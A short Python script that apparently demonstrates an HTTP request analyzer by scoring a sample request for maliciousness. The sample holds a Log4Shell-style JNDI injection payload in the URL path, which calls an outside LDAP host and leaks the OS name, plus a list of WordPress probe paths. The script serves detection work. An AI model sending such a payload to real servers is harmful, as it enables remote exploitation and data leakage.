import httpanalyzer


instance = httpanalyzer.Request(
    {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
     'Accept-Encoding': 'gzip, deflate, br',
     'Accept-Language': 'en-US,en;q=0.5',
     'Connection': 'keep-alive',
     'Host': '127.0.0.1:80',
     'User-Agent': 'curl/7.82.0'},
    '159.223.205.51',
    '/api/geojson?url=${jndi:ldap://${sys:os.name}.cd387hid68000106u4rtc.oast.me}',
    ['wp-content', 'wp-config', 'wp-includes', 'wp-admin', 'admin']
)
print(f"Malicious rating: {instance.malicious() * 100}%")
